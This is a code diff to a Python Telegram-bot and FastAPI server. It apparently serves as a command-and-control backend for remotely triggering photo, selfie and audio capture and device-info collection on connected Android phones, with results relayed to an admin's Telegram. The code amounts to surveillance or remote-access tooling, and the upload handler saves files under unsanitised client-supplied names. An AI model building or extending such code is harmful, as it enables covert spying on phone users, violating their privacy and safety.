@@ -26,10 +26,10 @@ dp = Dispatcher()
 def get_main_keyboard():
     # Tugmalar yaratish
     kb = [
-        [KeyboardButton(text="📸 Rasm olish")],
-        [KeyboardButton(text="🎙 Ovoz yozish (10 sek)"), KeyboardButton(text="🎥 Qisqa video (5 sek)")]
+        [KeyboardButton(text="📸 Rasm olish"), KeyboardButton(text="🤳 Selfie")],
+        [KeyboardButton(text="🎙 Ovoz yozish (10 sek)")],
+        [KeyboardButton(text="🔋 Batareya"), KeyboardButton(text="📱 Qurilma info")],
     ]
-    # resize_keyboard=True - tugmalar ekranda chiroyli joylashishi uchun
     return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)
 
 @dp.message(Command("start"))
@@ -45,7 +45,11 @@ async def start_handler(message: types.Message):
         reply_markup=get_main_keyboard()
     )
 
-@dp.message(F.text.in_({"📸 Rasm olish", "🎙 Ovoz yozish (10 sek)", "🎥 Qisqa video (5 sek)"}))
+@dp.message(F.text.in_({
+    "📸 Rasm olish", "🤳 Selfie",
+    "🎙 Ovoz yozish (10 sek)",
+    "🔋 Batareya", "📱 Qurilma info"
+}))
 async def action_handler(message: types.Message):
     """Tugma bosilganda ushbu funksiya ishlaydi"""
     if message.from_user.id != ADMIN_ID:
@@ -58,18 +62,23 @@ async def action_handler(message: types.Message):
     # Bosilgan tugmaga qarab qurilmaga jo'natiladigan signalni tanlaymiz
     command_map = {
         "📸 Rasm olish": "take_photo",
+        "🤳 Selfie": "selfie",
         "🎙 Ovoz yozish (10 sek)": "record_audio",
-        "🎥 Qisqa video (5 sek)": "record_video"
+        "🔋 Batareya": "battery",
+        "📱 Qurilma info": "device_info",
     }
     action = command_map[message.text]
     
     # Barcha ulangan qurilmalarga (telefonlarga) signal jo'natish
-    for device in connected_devices:
+    disconnected = set()
+    for device in set(connected_devices):
         try:
             await device.send_text(action)
         except Exception as e:
             print(f"Xabar yuborishda xatolik: {e}")
-            
+            disconnected.add(device)
+    connected_devices -= disconnected
+
     await message.answer(f"⏳ Buyruq qurilmaga yuborildi: {message.text}. Iltimos kuting...")
 
 # --- FastAPI Setup ---
@@ -106,27 +115,44 @@ async def send_media_to_admin(file_path: str, media_type: str):
         elif media_type == "audio":
             await bot.send_voice(chat_id=ADMIN_ID, voice=media, caption="🎙 Ovozli yozuv")
         elif media_type == "video":
-            # Video sifatida yuborish
             await bot.send_video(chat_id=ADMIN_ID, video=media, caption="🎥 Qisqa video")
     except Exception as e:
         print(f"Telegramga yuborish xatosi: {e}")
     finally:
-        # Faylni serverdan tozalash
         if os.path.exists(file_path):
             os.remove(file_path)
 
+async def send_text_to_admin(text: str):
+    """Matn ma'lumotlarini adminga yuborish"""
+    try:
+        await bot.send_message(chat_id=ADMIN_ID, text=text)
+    except Exception as e:
+        print(f"Matn yuborishda xatolik: {e}")
+
 @app.post("/upload")
-async def upload_media(background_tasks: BackgroundTasks, file: UploadFile = File(...), media_type: str = Form(...)):
-    """Android qurilmadan fayl (rasm, ovoz, video) qabul qilish"""
-    file_location = f"temp_{file.filename}"
-    with open(file_location, "wb+") as file_object:
-        file_object.write(await file.read())
-        
-    # Faylni adminga yuborish jarayonini orqa fonga o'tkazish
-    background_tasks.add_task(send_media_to_admin, file_location, media_type)
-    
+async def upload_media(
+    background_tasks: BackgroundTasks,
+    media_type: str = Form(...),
+    file: UploadFile = File(None),
+    text: str = Form(None)
+):
+    """Android qurilmadan fayl yoki matn qabul qilish"""
+    if media_type == "text" and text:
+        background_tasks.add_task(send_text_to_admin, text)
+    elif file:
+        file_location = f"temp_{file.filename}"
+        with open(file_location, "wb+") as file_object:
+            file_object.write(await file.read())
+        background_tasks.add_task(send_media_to_admin, file_location, media_type)
+
     return JSONResponse(content={"status": "success"})
 
 if __name__ == "__main__":
     import uvicorn
-    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)
+    uvicorn.run(
+        "main:app",
+        host="0.0.0.0",
+        port=8000,
+        reload=True,
+        reload_excludes=["client/*", "client/**/*", "*.spec", "*.bat"]
+    )
